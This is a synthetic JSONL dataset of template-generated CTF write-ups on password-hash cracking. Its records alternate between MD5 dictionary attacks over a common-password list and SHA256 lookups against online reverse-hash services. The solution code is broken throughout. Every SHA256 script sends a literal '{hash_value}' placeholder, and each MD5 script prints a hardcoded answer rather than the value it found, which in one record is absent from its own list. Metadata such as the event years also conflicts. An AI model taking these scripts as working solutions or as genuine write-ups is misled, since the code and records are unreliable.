{"id": "synthetic_hash_020", "team": "synthetic_team_5", "event": "CTF_2024_Event_15", "challenge_name": "SHA256 Rainbow Table #21", "challenge_description": "Use precomputed rainbow table for SHA256 hash", "attack_type": "Hash", "tools_used": ["hashlib", "requests"], "difficulty": "medium", "writeup": "# SHA256 Rainbow Table\n\n## Challenge Description\nUse precomputed rainbow table for SHA256 hash\n\n## Analysis\nThis challenge involves sha256 rainbow table techniques. The vulnerability can be exploited using the following approach:\n\n## Solution\n```python\n\nimport hashlib\nimport requests\n\ndef sha256_hash(text):\n    return hashlib.sha256(text.encode()).hexdigest()\n\ndef rainbow_table_lookup(hash_value):\n    # Query online rainbow table services\n    services = [\n        f\"https://md5decrypt.net/Api/api.php?hash={hash_value}&hash_type=sha256&email=test@test.com&code=code\",\n        f\"https://hashtoolkit.com/reverse-hash/?hash={hash_value}\"\n    ]\n    \n    for service in services:\n        try:\n            response = requests.get(service)\n            if response.status_code == 200 and response.text:\n                return response.text.strip()\n        except:\n            continue\n    return None\n\ntarget_hash = \"{hash_value}\"\nresult = rainbow_table_lookup(target_hash)\nif result:\n    print(f\"Found: {result}\")\n    print(f\"Flag: flag{{{result}}}\")\n\n```\n\n## Tools Used\n- hashlib, requests\n\n## Difficulty\nMedium\n\n## Flag\nThe flag can be recovered by executing the solution code above.", "solution_code": "\nimport hashlib\nimport requests\n\ndef sha256_hash(text):\n    return hashlib.sha256(text.encode()).hexdigest()\n\ndef rainbow_table_lookup(hash_value):\n    # Query online rainbow table services\n    services = [\n        f\"https://md5decrypt.net/Api/api.php?hash={hash_value}&hash_type=sha256&email=test@test.com&code=code\",\n        f\"https://hashtoolkit.com/reverse-hash/?hash={hash_value}\"\n    ]\n    \n    for service in services:\n        try:\n            response = requests.get(service)\n            if response.status_code == 200 and response.text:\n                return response.text.strip()\n        except:\n            continue\n    return None\n\ntarget_hash = \"{hash_value}\"\nresult = rainbow_table_lookup(target_hash)\nif result:\n    print(f\"Found: {result}\")\n    print(f\"Flag: flag{{{result}}}\")\n", "url": "https://synthetic-ctf.example.com/hash/20", "year": 2024, "category": "crypto", "file_type": ".md", "scraped_at": "2025-10-26T16:04:14.834443", "synthetic": true}
{"id": "synthetic_hash_021", "team": "synthetic_team_4", "event": "CTF_2024_Event_10", "challenge_name": "SHA256 Rainbow Table #22", "challenge_description": "Use precomputed rainbow table for SHA256 hash", "attack_type": "Hash", "tools_used": ["hashlib", "requests"], "difficulty": "medium", "writeup": "# SHA256 Rainbow Table\n\n## Challenge Description\nUse precomputed rainbow table for SHA256 hash\n\n## Analysis\nThis challenge involves sha256 rainbow table techniques. The vulnerability can be exploited using the following approach:\n\n## Solution\n```python\n\nimport hashlib\nimport requests\n\ndef sha256_hash(text):\n    return hashlib.sha256(text.encode()).hexdigest()\n\ndef rainbow_table_lookup(hash_value):\n    # Query online rainbow table services\n    services = [\n        f\"https://md5decrypt.net/Api/api.php?hash={hash_value}&hash_type=sha256&email=test@test.com&code=code\",\n        f\"https://hashtoolkit.com/reverse-hash/?hash={hash_value}\"\n    ]\n    \n    for service in services:\n        try:\n            response = requests.get(service)\n            if response.status_code == 200 and response.text:\n                return response.text.strip()\n        except:\n            continue\n    return None\n\ntarget_hash = \"{hash_value}\"\nresult = rainbow_table_lookup(target_hash)\nif result:\n    print(f\"Found: {result}\")\n    print(f\"Flag: flag{{{result}}}\")\n\n```\n\n## Tools Used\n- hashlib, requests\n\n## Difficulty\nMedium\n\n## Flag\nThe flag can be recovered by executing the solution code above.", "solution_code": "\nimport hashlib\nimport requests\n\ndef sha256_hash(text):\n    return hashlib.sha256(text.encode()).hexdigest()\n\ndef rainbow_table_lookup(hash_value):\n    # Query online rainbow table services\n    services = [\n        f\"https://md5decrypt.net/Api/api.php?hash={hash_value}&hash_type=sha256&email=test@test.com&code=code\",\n        f\"https://hashtoolkit.com/reverse-hash/?hash={hash_value}\"\n    ]\n    \n    for service in services:\n        try:\n            response = requests.get(service)\n            if response.status_code == 200 and response.text:\n                return response.text.strip()\n        except:\n            continue\n    return None\n\ntarget_hash = \"{hash_value}\"\nresult = rainbow_table_lookup(target_hash)\nif result:\n    print(f\"Found: {result}\")\n    print(f\"Flag: flag{{{result}}}\")\n", "url": "https://synthetic-ctf.example.com/hash/21", "year": 2024, "category": "crypto", "file_type": ".md", "scraped_at": "2025-10-26T16:04:14.834459", "synthetic": true}
{"id": "synthetic_hash_022", "team": "synthetic_team_9", "event": "CTF_2024_Event_18", "challenge_name": "SHA256 Rainbow Table #23", "challenge_description": "Use precomputed rainbow table for SHA256 hash", "attack_type": "Hash", "tools_used": ["hashlib", "requests"], "difficulty": "medium", "writeup": "# SHA256 Rainbow Table\n\n## Challenge Description\nUse precomputed rainbow table for SHA256 hash\n\n## Analysis\nThis challenge involves sha256 rainbow table techniques. The vulnerability can be exploited using the following approach:\n\n## Solution\n```python\n\nimport hashlib\nimport requests\n\ndef sha256_hash(text):\n    return hashlib.sha256(text.encode()).hexdigest()\n\ndef rainbow_table_lookup(hash_value):\n    # Query online rainbow table services\n    services = [\n        f\"https://md5decrypt.net/Api/api.php?hash={hash_value}&hash_type=sha256&email=test@test.com&code=code\",\n        f\"https://hashtoolkit.com/reverse-hash/?hash={hash_value}\"\n    ]\n    \n    for service in services:\n        try:\n            response = requests.get(service)\n            if response.status_code == 200 and response.text:\n                return response.text.strip()\n        except:\n            continue\n    return None\n\ntarget_hash = \"{hash_value}\"\nresult = rainbow_table_lookup(target_hash)\nif result:\n    print(f\"Found: {result}\")\n    print(f\"Flag: flag{{{result}}}\")\n\n```\n\n## Tools Used\n- hashlib, requests\n\n## Difficulty\nMedium\n\n## Flag\nThe flag can be recovered by executing the solution code above.", "solution_code": "\nimport hashlib\nimport requests\n\ndef sha256_hash(text):\n    return hashlib.sha256(text.encode()).hexdigest()\n\ndef rainbow_table_lookup(hash_value):\n    # Query online rainbow table services\n    services = [\n        f\"https://md5decrypt.net/Api/api.php?hash={hash_value}&hash_type=sha256&email=test@test.com&code=code\",\n        f\"https://hashtoolkit.com/reverse-hash/?hash={hash_value}\"\n    ]\n    \n    for service in services:\n        try:\n            response = requests.get(service)\n            if response.status_code == 200 and response.text:\n                return response.text.strip()\n        except:\n            continue\n    return None\n\ntarget_hash = \"{hash_value}\"\nresult = rainbow_table_lookup(target_hash)\nif result:\n    print(f\"Found: {result}\")\n    print(f\"Flag: flag{{{result}}}\")\n", "url": "https://synthetic-ctf.example.com/hash/22", "year": 2024, "category": "crypto", "file_type": ".md", "scraped_at": "2025-10-26T16:04:14.834473", "synthetic": true}
{"id": "synthetic_hash_023", "team": "synthetic_team_6", "event": "CTF_2024_Event_10", "challenge_name": "SHA256 Rainbow Table #24", "challenge_description": "Use precomputed rainbow table for SHA256 hash", "attack_type": "Hash", "tools_used": ["hashlib", "requests"], "difficulty": "medium", "writeup": "# SHA256 Rainbow Table\n\n## Challenge Description\nUse precomputed rainbow table for SHA256 hash\n\n## Analysis\nThis challenge involves sha256 rainbow table techniques. The vulnerability can be exploited using the following approach:\n\n## Solution\n```python\n\nimport hashlib\nimport requests\n\ndef sha256_hash(text):\n    return hashlib.sha256(text.encode()).hexdigest()\n\ndef rainbow_table_lookup(hash_value):\n    # Query online rainbow table services\n    services = [\n        f\"https://md5decrypt.net/Api/api.php?hash={hash_value}&hash_type=sha256&email=test@test.com&code=code\",\n        f\"https://hashtoolkit.com/reverse-hash/?hash={hash_value}\"\n    ]\n    \n    for service in services:\n        try:\n            response = requests.get(service)\n            if response.status_code == 200 and response.text:\n                return response.text.strip()\n        except:\n            continue\n    return None\n\ntarget_hash = \"{hash_value}\"\nresult = rainbow_table_lookup(target_hash)\nif result:\n    print(f\"Found: {result}\")\n    print(f\"Flag: flag{{{result}}}\")\n\n```\n\n## Tools Used\n- hashlib, requests\n\n## Difficulty\nMedium\n\n## Flag\nThe flag can be recovered by executing the solution code above.", "solution_code": "\nimport hashlib\nimport requests\n\ndef sha256_hash(text):\n    return hashlib.sha256(text.encode()).hexdigest()\n\ndef rainbow_table_lookup(hash_value):\n    # Query online rainbow table services\n    services = [\n        f\"https://md5decrypt.net/Api/api.php?hash={hash_value}&hash_type=sha256&email=test@test.com&code=code\",\n        f\"https://hashtoolkit.com/reverse-hash/?hash={hash_value}\"\n    ]\n    \n    for service in services:\n        try:\n            response = requests.get(service)\n            if response.status_code == 200 and response.text:\n                return response.text.strip()\n        except:\n            continue\n    return None\n\ntarget_hash = \"{hash_value}\"\nresult = rainbow_table_lookup(target_hash)\nif result:\n    print(f\"Found: {result}\")\n    print(f\"Flag: flag{{{result}}}\")\n", "url": "https://synthetic-ctf.example.com/hash/23", "year": 2024, "category": "crypto", "file_type": ".md", "scraped_at": "2025-10-26T16:04:14.834489", "synthetic": true}
{"id": "synthetic_hash_024", "team": "synthetic_team_3", "event": "CTF_2024_Event_13", "challenge_name": "MD5 Dictionary Attack #25", "challenge_description": "Crack MD5 hash using dictionary attack", "attack_type": "Hash", "tools_used": ["hashlib"], "difficulty": "easy", "writeup": "# MD5 Dictionary Attack\n\n## Challenge Description\nCrack MD5 hash using dictionary attack\n\n## Analysis\nThis challenge involves md5 dictionary attack techniques. The vulnerability can be exploited using the following approach:\n\n## Solution\n```python\n\nimport hashlib\n\ndef md5_hash(text):\n    return hashlib.md5(text.encode()).hexdigest()\n\ntarget_hash = \"cc03e747a6afbbcbf8be7668acfebee5\"\n\n# Common passwords dictionary\npasswords = [\n    \"password\", \"123456\", \"password123\", \"admin\", \"letmein\",\n    \"welcome\", \"monkey\", \"1234567890\", \"qwerty\", \"abc123\",\n    \"password1\", \"123123\", \"000000\", \"iloveyou\", \"1234567\"\n]\n\nfor password in passwords:\n    if md5_hash(password) == target_hash:\n        print(f\"Found: test123\")\n        print(f\"Flag: flag{test123}\")\n        break\n\n```\n\n## Tools Used\n- hashlib\n\n## Difficulty\nEasy\n\n## Flag\nThe flag can be recovered by executing the solution code above.", "solution_code": "\nimport hashlib\n\ndef md5_hash(text):\n    return hashlib.md5(text.encode()).hexdigest()\n\ntarget_hash = \"cc03e747a6afbbcbf8be7668acfebee5\"\n\n# Common passwords dictionary\npasswords = [\n    \"password\", \"123456\", \"password123\", \"admin\", \"letmein\",\n    \"welcome\", \"monkey\", \"1234567890\", \"qwerty\", \"abc123\",\n    \"password1\", \"123123\", \"000000\", \"iloveyou\", \"1234567\"\n]\n\nfor password in passwords:\n    if md5_hash(password) == target_hash:\n        print(f\"Found: test123\")\n        print(f\"Flag: flag{test123}\")\n        break\n", "url": "https://synthetic-ctf.example.com/hash/24", "year": 2024, "category": "crypto", "file_type": ".md", "scraped_at": "2025-10-26T16:04:14.834509", "synthetic": true}
{"id": "synthetic_hash_025", "team": "synthetic_team_10", "event": "CTF_2024_Event_8", "challenge_name": "MD5 Dictionary Attack #26", "challenge_description": "Crack MD5 hash using dictionary attack", "attack_type": "Hash", "tools_used": ["hashlib"], "difficulty": "easy", "writeup": "# MD5 Dictionary Attack\n\n## Challenge Description\nCrack MD5 hash using dictionary attack\n\n## Analysis\nThis challenge involves md5 dictionary attack techniques. The vulnerability can be exploited using the following approach:\n\n## Solution\n```python\n\nimport hashlib\n\ndef md5_hash(text):\n    return hashlib.md5(text.encode()).hexdigest()\n\ntarget_hash = \"21232f297a57a5a743894a0e4a801fc3\"\n\n# Common passwords dictionary\npasswords = [\n    \"password\", \"123456\", \"password123\", \"admin\", \"letmein\",\n    \"welcome\", \"monkey\", \"1234567890\", \"qwerty\", \"abc123\",\n    \"password1\", \"123123\", \"000000\", \"iloveyou\", \"1234567\"\n]\n\nfor password in passwords:\n    if md5_hash(password) == target_hash:\n        print(f\"Found: admin\")\n        print(f\"Flag: flag{admin}\")\n        break\n\n```\n\n## Tools Used\n- hashlib\n\n## Difficulty\nEasy\n\n## Flag\nThe flag can be recovered by executing the solution code above.", "solution_code": "\nimport hashlib\n\ndef md5_hash(text):\n    return hashlib.md5(text.encode()).hexdigest()\n\ntarget_hash = \"21232f297a57a5a743894a0e4a801fc3\"\n\n# Common passwords dictionary\npasswords = [\n    \"password\", \"123456\", \"password123\", \"admin\", \"letmein\",\n    \"welcome\", \"monkey\", \"1234567890\", \"qwerty\", \"abc123\",\n    \"password1\", \"123123\", \"000000\", \"iloveyou\", \"1234567\"\n]\n\nfor password in passwords:\n    if md5_hash(password) == target_hash:\n        print(f\"Found: admin\")\n        print(f\"Flag: flag{admin}\")\n        break\n", "url": "https://synthetic-ctf.example.com/hash/25", "year": 2024, "category": "crypto", "file_type": ".md", "scraped_at": "2025-10-26T16:04:14.834527", "synthetic": true}
{"id": "synthetic_hash_026", "team": "synthetic_team_10", "event": "CTF_2024_Event_6", "challenge_name": "SHA256 Rainbow Table #27", "challenge_description": "Use precomputed rainbow table for SHA256 hash", "attack_type": "Hash", "tools_used": ["hashlib", "requests"], "difficulty": "medium", "writeup": "# SHA256 Rainbow Table\n\n## Challenge Description\nUse precomputed rainbow table for SHA256 hash\n\n## Analysis\nThis challenge involves sha256 rainbow table techniques. The vulnerability can be exploited using the following approach:\n\n## Solution\n```python\n\nimport hashlib\nimport requests\n\ndef sha256_hash(text):\n    return hashlib.sha256(text.encode()).hexdigest()\n\ndef rainbow_table_lookup(hash_value):\n    # Query online rainbow table services\n    services = [\n        f\"https://md5decrypt.net/Api/api.php?hash={hash_value}&hash_type=sha256&email=test@test.com&code=code\",\n        f\"https://hashtoolkit.com/reverse-hash/?hash={hash_value}\"\n    ]\n    \n    for service in services:\n        try:\n            response = requests.get(service)\n            if response.status_code == 200 and response.text:\n                return response.text.strip()\n        except:\n            continue\n    return None\n\ntarget_hash = \"{hash_value}\"\nresult = rainbow_table_lookup(target_hash)\nif result:\n    print(f\"Found: {result}\")\n    print(f\"Flag: flag{{{result}}}\")\n\n```\n\n## Tools Used\n- hashlib, requests\n\n## Difficulty\nMedium\n\n## Flag\nThe flag can be recovered by executing the solution code above.", "solution_code": "\nimport hashlib\nimport requests\n\ndef sha256_hash(text):\n    return hashlib.sha256(text.encode()).hexdigest()\n\ndef rainbow_table_lookup(hash_value):\n    # Query online rainbow table services\n    services = [\n        f\"https://md5decrypt.net/Api/api.php?hash={hash_value}&hash_type=sha256&email=test@test.com&code=code\",\n        f\"https://hashtoolkit.com/reverse-hash/?hash={hash_value}\"\n    ]\n    \n    for service in services:\n        try:\n            response = requests.get(service)\n            if response.status_code == 200 and response.text:\n                return response.text.strip()\n        except:\n            continue\n    return None\n\ntarget_hash = \"{hash_value}\"\nresult = rainbow_table_lookup(target_hash)\nif result:\n    print(f\"Found: {result}\")\n    print(f\"Flag: flag{{{result}}}\")\n", "url": "https://synthetic-ctf.example.com/hash/26", "year": 2024, "category": "crypto", "file_type": ".md", "scraped_at": "2025-10-26T16:04:14.834540", "synthetic": true}
{"id": "synthetic_hash_027", "team": "synthetic_team_7", "event": "CTF_2024_Event_7", "challenge_name": "SHA256 Rainbow Table #28", "challenge_description": "Use precomputed rainbow table for SHA256 hash", "attack_type": "Hash", "tools_used": ["hashlib", "requests"], "difficulty": "medium", "writeup": "# SHA256 Rainbow Table\n\n## Challenge Description\nUse precomputed rainbow table for SHA256 hash\n\n## Analysis\nThis challenge involves sha256 rainbow table techniques. The vulnerability can be exploited using the following approach:\n\n## Solution\n```python\n\nimport hashlib\nimport requests\n\ndef sha256_hash(text):\n    return hashlib.sha256(text.encode()).hexdigest()\n\ndef rainbow_table_lookup(hash_value):\n    # Query online rainbow table services\n    services = [\n        f\"https://md5decrypt.net/Api/api.php?hash={hash_value}&hash_type=sha256&email=test@test.com&code=code\",\n        f\"https://hashtoolkit.com/reverse-hash/?hash={hash_value}\"\n    ]\n    \n    for service in services:\n        try:\n            response = requests.get(service)\n            if response.status_code == 200 and response.text:\n                return response.text.strip()\n        except:\n            continue\n    return None\n\ntarget_hash = \"{hash_value}\"\nresult = rainbow_table_lookup(target_hash)\nif result:\n    print(f\"Found: {result}\")\n    print(f\"Flag: flag{{{result}}}\")\n\n```\n\n## Tools Used\n- hashlib, requests\n\n## Difficulty\nMedium\n\n## Flag\nThe flag can be recovered by executing the solution code above.", "solution_code": "\nimport hashlib\nimport requests\n\ndef sha256_hash(text):\n    return hashlib.sha256(text.encode()).hexdigest()\n\ndef rainbow_table_lookup(hash_value):\n    # Query online rainbow table services\n    services = [\n        f\"https://md5decrypt.net/Api/api.php?hash={hash_value}&hash_type=sha256&email=test@test.com&code=code\",\n        f\"https://hashtoolkit.com/reverse-hash/?hash={hash_value}\"\n    ]\n    \n    for service in services:\n        try:\n            response = requests.get(service)\n            if response.status_code == 200 and response.text:\n                return response.text.strip()\n        except:\n            continue\n    return None\n\ntarget_hash = \"{hash_value}\"\nresult = rainbow_table_lookup(target_hash)\nif result:\n    print(f\"Found: {result}\")\n    print(f\"Flag: flag{{{result}}}\")\n", "url": "https://synthetic-ctf.example.com/hash/27", "year": 2023, "category": "crypto", "file_type": ".md", "scraped_at": "2025-10-26T16:04:14.834554", "synthetic": true}
{"id": "synthetic_hash_028", "team": "synthetic_team_4", "event": "CTF_2024_Event_20", "challenge_name": "MD5 Dictionary Attack #29", "challenge_description": "Crack MD5 hash using dictionary attack", "attack_type": "Hash", "tools_used": ["hashlib"], "difficulty": "easy", "writeup": "# MD5 Dictionary Attack\n\n## Challenge Description\nCrack MD5 hash using dictionary attack\n\n## Analysis\nThis challenge involves md5 dictionary attack techniques. The vulnerability can be exploited using the following approach:\n\n## Solution\n```python\n\nimport hashlib\n\ndef md5_hash(text):\n    return hashlib.md5(text.encode()).hexdigest()\n\ntarget_hash = \"5ebe2294ecd0e0f08eab7690d2a6ee69\"\n\n# Common passwords dictionary\npasswords = [\n    \"password\", \"123456\", \"password123\", \"admin\", \"letmein\",\n    \"welcome\", \"monkey\", \"1234567890\", \"qwerty\", \"abc123\",\n    \"password1\", \"123123\", \"000000\", \"iloveyou\", \"1234567\"\n]\n\nfor password in passwords:\n    if md5_hash(password) == target_hash:\n        print(f\"Found: secret\")\n        print(f\"Flag: flag{secret}\")\n        break\n\n```\n\n## Tools Used\n- hashlib\n\n## Difficulty\nEasy\n\n## Flag\nThe flag can be recovered by executing the solution code above.", "solution_code": "\nimport hashlib\n\ndef md5_hash(text):\n    return hashlib.md5(text.encode()).hexdigest()\n\ntarget_hash = \"5ebe2294ecd0e0f08eab7690d2a6ee69\"\n\n# Common passwords dictionary\npasswords = [\n    \"password\", \"123456\", \"password123\", \"admin\", \"letmein\",\n    \"welcome\", \"monkey\", \"1234567890\", \"qwerty\", \"abc123\",\n    \"password1\", \"123123\", \"000000\", \"iloveyou\", \"1234567\"\n]\n\nfor password in passwords:\n    if md5_hash(password) == target_hash:\n        print(f\"Found: secret\")\n        print(f\"Flag: flag{secret}\")\n        break\n", "url": "https://synthetic-ctf.example.com/hash/28", "year": 2023, "category": "crypto", "file_type": ".md", "scraped_at": "2025-10-26T16:04:14.834572", "synthetic": true}
{"id": "synthetic_hash_029", "team": "synthetic_team_6", "event": "CTF_2024_Event_7", "challenge_name": "MD5 Dictionary Attack #30", "challenge_description": "Crack MD5 hash using dictionary attack", "attack_type": "Hash", "tools_used": ["hashlib"], "difficulty": "easy", "writeup": "# MD5 Dictionary Attack\n\n## Challenge Description\nCrack MD5 hash using dictionary attack\n\n## Analysis\nThis challenge involves md5 dictionary attack techniques. The vulnerability can be exploited using the following approach:\n\n## Solution\n```python\n\nimport hashlib\n\ndef md5_hash(text):\n    return hashlib.md5(text.encode()).hexdigest()\n\ntarget_hash = \"482c811da5d5b4bc6d497ffa98491e38\"\n\n# Common passwords dictionary\npasswords = [\n    \"password\", \"123456\", \"password123\", \"admin\", \"letmein\",\n    \"welcome\", \"monkey\", \"1234567890\", \"qwerty\", \"abc123\",\n    \"password1\", \"123123\", \"000000\", \"iloveyou\", \"1234567\"\n]\n\nfor password in passwords:\n    if md5_hash(password) == target_hash:\n        print(f\"Found: password123\")\n        print(f\"Flag: flag{password123}\")\n        break\n\n```\n\n## Tools Used\n- hashlib\n\n## Difficulty\nEasy\n\n## Flag\nThe flag can be recovered by executing the solution code above.", "solution_code": "\nimport hashlib\n\ndef md5_hash(text):\n    return hashlib.md5(text.encode()).hexdigest()\n\ntarget_hash = \"482c811da5d5b4bc6d497ffa98491e38\"\n\n# Common passwords dictionary\npasswords = [\n    \"password\", \"123456\", \"password123\", \"admin\", \"letmein\",\n    \"welcome\", \"monkey\", \"1234567890\", \"qwerty\", \"abc123\",\n    \"password1\", \"123123\", \"000000\", \"iloveyou\", \"1234567\"\n]\n\nfor password in passwords:\n    if md5_hash(password) == target_hash:\n        print(f\"Found: password123\")\n        print(f\"Flag: flag{password123}\")\n        break\n", "url": "https://synthetic-ctf.example.com/hash/29", "year": 2023, "category": "crypto", "file_type": ".md", "scraped_at": "2025-10-26T16:04:14.834590", "synthetic": true}
{"id": "synthetic_hash_030", "team": "synthetic_team_6", "event": "CTF_2024_Event_19", "challenge_name": "SHA256 Rainbow Table #31", "challenge_description": "Use precomputed rainbow table for SHA256 hash", "attack_type": "Hash", "tools_used": ["hashlib", "requests"], "difficulty": "medium", "writeup": "# SHA256 Rainbow Table\n\n## Challenge Description\nUse precomputed rainbow table for SHA256 hash\n\n## Analysis\nThis challenge involves sha256 rainbow table techniques. The vulnerability can be exploited using the following approach:\n\n## Solution\n```python\n\nimport hashlib\nimport requests\n\ndef sha256_hash(text):\n    return hashlib.sha256(text.encode()).hexdigest()\n\ndef rainbow_table_lookup(hash_value):\n    # Query online rainbow table services\n    services = [\n        f\"https://md5decrypt.net/Api/api.php?hash={hash_value}&hash_type=sha256&email=test@test.com&code=code\",\n        f\"https://hashtoolkit.com/reverse-hash/?hash={hash_value}\"\n    ]\n    \n    for service in services:\n        try:\n            response = requests.get(service)\n            if response.status_code == 200 and response.text:\n                return response.text.strip()\n        except:\n            continue\n    return None\n\ntarget_hash = \"{hash_value}\"\nresult = rainbow_table_lookup(target_hash)\nif result:\n    print(f\"Found: {result}\")\n    print(f\"Flag: flag{{{result}}}\")\n\n```\n\n## Tools Used\n- hashlib, requests\n\n## Difficulty\nMedium\n\n## Flag\nThe flag can be recovered by executing the solution code above.", "solution_code": "\nimport hashlib\nimport requests\n\ndef sha256_hash(text):\n    return hashlib.sha256(text.encode()).hexdigest()\n\ndef rainbow_table_lookup(hash_value):\n    # Query online rainbow table services\n    services = [\n        f\"https://md5decrypt.net/Api/api.php?hash={hash_value}&hash_type=sha256&email=test@test.com&code=code\",\n        f\"https://hashtoolkit.com/reverse-hash/?hash={hash_value}\"\n    ]\n    \n    for service in services:\n        try:\n            response = requests.get(service)\n            if response.status_code == 200 and response.text:\n                return response.text.strip()\n        except:\n            continue\n    return None\n\ntarget_hash = \"{hash_value}\"\nresult = rainbow_table_lookup(target_hash)\nif result:\n    print(f\"Found: {result}\")\n    print(f\"Flag: flag{{{result}}}\")\n", "url": "https://synthetic-ctf.example.com/hash/30", "year": 2023, "category": "crypto", "file_type": ".md", "scraped_at": "2025-10-26T16:04:14.834604", "synthetic": true}
{"id": "synthetic_hash_031", "team": "synthetic_team_9", "event": "CTF_2024_Event_18", "challenge_name": "MD5 Dictionary Attack #32", "challenge_description": "Crack MD5 hash using dictionary attack", "attack_type": "Hash", "tools_used": ["hashlib"], "difficulty": "easy", "writeup": "# MD5 Dictionary Attack\n\n## Challenge Description\nCrack MD5 hash using dictionary attack\n\n## Analysis\nThis challenge involves md5 dictionary attack techniques. The vulnerability can be exploited using the following approach:\n\n## Solution\n```python\n\nimport hashlib\n\ndef md5_hash(text):\n    return hashlib.md5(text.encode()).hexdigest()\n\ntarget_hash = \"21232f297a57a5a743894a0e4a801fc3\"\n\n# Common passwords dictionary\npasswords = [\n    \"password\", \"123456\", \"password123\", \"admin\", \"letmein\",\n    \"welcome\", \"monkey\", \"1234567890\", \"qwerty\", \"abc123\",\n    \"password1\", \"123123\", \"000000\", \"iloveyou\", \"1234567\"\n]\n\nfor password in passwords:\n    if md5_hash(password) == target_hash:\n        print(f\"Found: admin\")\n        print(f\"Flag: flag{admin}\")\n        break\n\n```\n\n## Tools Used\n- hashlib\n\n## Difficulty\nEasy\n\n## Flag\nThe flag can be recovered by executing the solution code above.", "solution_code": "\nimport hashlib\n\ndef md5_hash(text):\n    return hashlib.md5(text.encode()).hexdigest()\n\ntarget_hash = \"21232f297a57a5a743894a0e4a801fc3\"\n\n# Common passwords dictionary\npasswords = [\n    \"password\", \"123456\", \"password123\", \"admin\", \"letmein\",\n    \"welcome\", \"monkey\", \"1234567890\", \"qwerty\", \"abc123\",\n    \"password1\", \"123123\", \"000000\", \"iloveyou\", \"1234567\"\n]\n\nfor password in passwords:\n    if md5_hash(password) == target_hash:\n        print(f\"Found: admin\")\n        print(f\"Flag: flag{admin}\")\n        break\n", "url": "https://synthetic-ctf.example.com/hash/31", "year": 2024, "category": "crypto", "file_type": ".md", "scraped_at": "2025-10-26T16:04:14.834628", "synthetic": true}
{"id": "synthetic_hash_032", "team": "synthetic_team_4", "event": "CTF_2024_Event_3", "challenge_name": "MD5 Dictionary Attack #33", "challenge_description": "Crack MD5 hash using dictionary attack", "attack_type": "Hash", "tools_used": ["hashlib"], "difficulty": "easy", "writeup": "# MD5 Dictionary Attack\n\n## Challenge Description\nCrack MD5 hash using dictionary attack\n\n## Analysis\nThis challenge involves md5 dictionary attack techniques. The vulnerability can be exploited using the following approach:\n\n## Solution\n```python\n\nimport hashlib\n\ndef md5_hash(text):\n    return hashlib.md5(text.encode()).hexdigest()\n\ntarget_hash = \"5ebe2294ecd0e0f08eab7690d2a6ee69\"\n\n# Common passwords dictionary\npasswords = [\n    \"password\", \"123456\", \"password123\", \"admin\", \"letmein\",\n    \"welcome\", \"monkey\", \"1234567890\", \"qwerty\", \"abc123\",\n    \"password1\", \"123123\", \"000000\", \"iloveyou\", \"1234567\"\n]\n\nfor password in passwords:\n    if md5_hash(password) == target_hash:\n        print(f\"Found: secret\")\n        print(f\"Flag: flag{secret}\")\n        break\n\n```\n\n## Tools Used\n- hashlib\n\n## Difficulty\nEasy\n\n## Flag\nThe flag can be recovered by executing the solution code above.", "solution_code": "\nimport hashlib\n\ndef md5_hash(text):\n    return hashlib.md5(text.encode()).hexdigest()\n\ntarget_hash = \"5ebe2294ecd0e0f08eab7690d2a6ee69\"\n\n# Common passwords dictionary\npasswords = [\n    \"password\", \"123456\", \"password123\", \"admin\", \"letmein\",\n    \"welcome\", \"monkey\", \"1234567890\", \"qwerty\", \"abc123\",\n    \"password1\", \"123123\", \"000000\", \"iloveyou\", \"1234567\"\n]\n\nfor password in passwords:\n    if md5_hash(password) == target_hash:\n        print(f\"Found: secret\")\n        print(f\"Flag: flag{secret}\")\n        break\n", "url": "https://synthetic-ctf.example.com/hash/32", "year": 2023, "category": "crypto", "file_type": ".md", "scraped_at": "2025-10-26T16:04:14.834648", "synthetic": true}
{"id": "synthetic_hash_033", "team": "synthetic_team_5", "event": "CTF_2024_Event_12", "challenge_name": "SHA256 Rainbow Table #34", "challenge_description": "Use precomputed rainbow table for SHA256 hash", "attack_type": "Hash", "tools_used": ["hashlib", "requests"], "difficulty": "medium", "writeup": "# SHA256 Rainbow Table\n\n## Challenge Description\nUse precomputed rainbow table for SHA256 hash\n\n## Analysis\nThis challenge involves sha256 rainbow table techniques. The vulnerability can be exploited using the following approach:\n\n## Solution\n```python\n\nimport hashlib\nimport requests\n\ndef sha256_hash(text):\n    return hashlib.sha256(text.encode()).hexdigest()\n\ndef rainbow_table_lookup(hash_value):\n    # Query online rainbow table services\n    services = [\n        f\"https://md5decrypt.net/Api/api.php?hash={hash_value}&hash_type=sha256&email=test@test.com&code=code\",\n        f\"https://hashtoolkit.com/reverse-hash/?hash={hash_value}\"\n    ]\n    \n    for service in services:\n        try:\n            response = requests.get(service)\n            if response.status_code == 200 and response.text:\n                return response.text.strip()\n        except:\n            continue\n    return None\n\ntarget_hash = \"{hash_value}\"\nresult = rainbow_table_lookup(target_hash)\nif result:\n    print(f\"Found: {result}\")\n    print(f\"Flag: flag{{{result}}}\")\n\n```\n\n## Tools Used\n- hashlib, requests\n\n## Difficulty\nMedium\n\n## Flag\nThe flag can be recovered by executing the solution code above.", "solution_code": "\nimport hashlib\nimport requests\n\ndef sha256_hash(text):\n    return hashlib.sha256(text.encode()).hexdigest()\n\ndef rainbow_table_lookup(hash_value):\n    # Query online rainbow table services\n    services = [\n        f\"https://md5decrypt.net/Api/api.php?hash={hash_value}&hash_type=sha256&email=test@test.com&code=code\",\n        f\"https://hashtoolkit.com/reverse-hash/?hash={hash_value}\"\n    ]\n    \n    for service in services:\n        try:\n            response = requests.get(service)\n            if response.status_code == 200 and response.text:\n                return response.text.strip()\n        except:\n            continue\n    return None\n\ntarget_hash = \"{hash_value}\"\nresult = rainbow_table_lookup(target_hash)\nif result:\n    print(f\"Found: {result}\")\n    print(f\"Flag: flag{{{result}}}\")\n", "url": "https://synthetic-ctf.example.com/hash/33", "year": 2024, "category": "crypto", "file_type": ".md", "scraped_at": "2025-10-26T16:04:14.834662", "synthetic": true}
